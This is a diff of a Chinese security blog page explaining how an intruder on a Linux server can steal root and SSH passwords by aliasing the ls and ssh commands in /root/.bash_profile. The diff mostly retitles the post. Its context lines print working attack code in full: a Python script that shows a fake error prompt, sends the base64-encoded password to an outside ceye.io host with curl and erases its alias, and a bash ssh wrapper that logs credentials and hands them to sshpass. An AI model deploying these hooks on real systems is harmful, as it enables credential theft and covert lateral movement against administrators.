@@ -8,7 +8,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="当通过web途径获取到linux机器时，往往想获取到root明文密码进行横向扩展，但是拿到shadow又无法解密，此时可以通过设置别名进行窃取管理员密码。 劫持系统ls命令：首先设置变量别名到环境变量下并赋值文件权限 12echo &amp;quot;alias ls=/var/tmp/update.py&amp;quot;&amp;gt;&amp;gt; /root/.bash_profile chmod u+x /var/t">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于linux别名特性窃取密码">
+<meta property="og:title" content="探索基于linux别名特性窃取密码">
 <meta property="og:url" content="http://yoursite.com/2020/02/12/----3/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
 <meta property="og:description" content="当通过web途径获取到linux机器时，往往想获取到root明文密码进行横向扩展，但是拿到shadow又无法解密，此时可以通过设置别名进行窃取管理员密码。 劫持系统ls命令：首先设置变量别名到环境变量下并赋值文件权限 12echo &amp;quot;alias ls=/var/tmp/update.py&amp;quot;&amp;gt;&amp;gt; /root/.bash_profile chmod u+x /var/t">
@@ -16,9 +16,9 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44bdec28011f685eb60942">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44be5432f2ca5a1c6f190b">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44c01790144e59595037cb">
-<meta property="og:updated_time" content="2020-02-13T03:22:07.000Z">
+<meta property="og:updated_time" content="2020-02-13T03:28:38.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基于linux别名特性窃取密码">
+<meta name="twitter:title" content="探索基于linux别名特性窃取密码">
 <meta name="twitter:description" content="当通过web途径获取到linux机器时，往往想获取到root明文密码进行横向扩展，但是拿到shadow又无法解密，此时可以通过设置别名进行窃取管理员密码。 劫持系统ls命令：首先设置变量别名到环境变量下并赋值文件权限 12echo &amp;quot;alias ls=/var/tmp/update.py&amp;quot;&amp;gt;&amp;gt; /root/.bash_profile chmod u+x /var/t">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44bdec28011f685eb60942">
     
@@ -40,7 +40,7 @@
         
     
     <!-- title -->
-    <title>基于linux别名特性窃取密码</title>
+    <title>探索基于linux别名特性窃取密码</title>
     <!-- styles -->
     <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
     <!-- persian styles -->
@@ -91,15 +91,15 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/02/12/----3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/02/12/----3/&text=基于linux别名特性窃取密码"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/12/----3/&is_video=false&description=基于linux别名特性窃取密码"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=基于linux别名特性窃取密码&body=Check out this article: http://yoursite.com/2020/02/12/----3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/12/----3/&name=基于linux别名特性窃取密码&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/02/12/----3/&text=探索基于linux别名特性窃取密码"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/12/----3/&is_video=false&description=探索基于linux别名特性窃取密码"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=探索基于linux别名特性窃取密码&body=Check out this article: http://yoursite.com/2020/02/12/----3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/12/----3/&name=探索基于linux别名特性窃取密码&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -116,7 +116,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        基于linux别名特性窃取密码
+        探索基于linux别名特性窃取密码
     </h1>
 
 
@@ -149,14 +149,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import getpass</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">filex = &quot;/var/tmp/.pwds&quot;</span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line"></span><br><span class="line">    if os.path.exists(filex):</span><br><span class="line">        os.system(&apos;ls&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print((&quot;An unknown error occured and confirm your password:&quot;))</span><br><span class="line">        pwd = getpass.getpass(&quot;Password:&quot;)</span><br><span class="line">        if len(pwd) == 0:</span><br><span class="line">            pwd = getpass.getpass(&quot;Password:&quot;)</span><br><span class="line"></span><br><span class="line">        # with open(filex,&apos;w+&apos;) as f:</span><br><span class="line">        #     f.write(a)</span><br><span class="line">        url = &apos;http://shv707.ceye.io/&#123;&#125;&apos;.format(base64.b64encode(pwd))</span><br><span class="line">        os.popen(&apos;curl &#123;&#125; 2&gt;/dev/null&apos;.format(url))</span><br><span class="line">        os.popen(&quot;sed -i &apos;$d&apos; /root/.bash_profile&quot;)</span><br><span class="line">        os.mkdir(filex)</span><br><span class="line">        os.system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    password()</span><br></pre></td></tr></table></figure>
 <p>等待管理员连接服务器后并执行ls时，就会弹出报错，要求输入密码而后将输入进的内容进行base64编码，通过拼接回传到攻击者页面，执行正常的命令并将环境变量恢复原样。</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5e44bdec28011f685eb60942" alt=""></p>
-<h1 id="劫持系统ssh命令："><a href="#劫持系统ssh命令：" class="headerlink" title="劫持系统ssh命令："></a>劫持系统ssh命令：</h1><p>当管理员执行ssh user@rhost时，首先执行攻击者设置好的别名文件，负责将输入的内容进行回传或保存本地，由于ssh不能通过管道符进行传参，并使用sshpass传参给正常的ssh连接。</p>
+<h1 id="劫持系统ssh命令："><a href="#劫持系统ssh命令：" class="headerlink" title="劫持系统ssh命令："></a>劫持系统ssh命令：</h1><p>当管理员执行ssh user@rhost时，首先执行攻击者设置好的别名文件，负责将输入的内容进行回传或保存本地，由于ssh不能通过管道符进行传参，则使用sshpass传参给正常的ssh连接。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;alias ssh=/var/tmp/ssh&quot;&gt;&gt; /root/.bash_profile </span><br><span class="line">chmod u+x /var/tmp/ssh</span><br></pre></td></tr></table></figure>
 <p>shell脚本具体代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# != &quot;1&quot; ] </span><br><span class="line">then </span><br><span class="line">	/usr/bin/ssh </span><br><span class="line">else </span><br><span class="line">	echo -e &quot;$&#123;1&#125;&apos;s password: \c&quot; </span><br><span class="line">	read -s pass </span><br><span class="line">	echo $1&quot;:&quot;$pass &gt;&gt; /var/tmp/.log </span><br><span class="line">	echo &quot;&quot; </span><br><span class="line">	sshpass -p &quot;$pass&quot; /usr/bin/ssh $&#123;1&#125;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
 <p>sshpass是用于非交互的ssh 密码验证</p>
 <p>从命令行方式传递密码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p user_password ssh user_name@rhost</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://sourceforge.net/projects/sshpass/files/latest/download -O sshpass.tar.gz</span><br></pre></td></tr></table></figure>
+<p><code>sshpass -p user_password ssh user_name@rhost</code></p>
+<p><code>wget http://sourceforge.net/projects/sshpass/files/latest/download -O sshpass.tar.gz</code></p>
 <p>下载后，解压，安装</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5e44be5432f2ca5a1c6f190b" alt=""></p>
@@ -193,15 +193,15 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/02/12/----3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/02/12/----3/&text=基于linux别名特性窃取密码"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/12/----3/&is_video=false&description=基于linux别名特性窃取密码"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=基于linux别名特性窃取密码&body=Check out this article: http://yoursite.com/2020/02/12/----3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=基于linux别名特性窃取密码"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/12/----3/&name=基于linux别名特性窃取密码&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/02/12/----3/&text=探索基于linux别名特性窃取密码"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/12/----3/&is_video=false&description=探索基于linux别名特性窃取密码"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=探索基于linux别名特性窃取密码&body=Check out this article: http://yoursite.com/2020/02/12/----3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/02/12/----3/&title=探索基于linux别名特性窃取密码"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/12/----3/&name=探索基于linux别名特性窃取密码&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
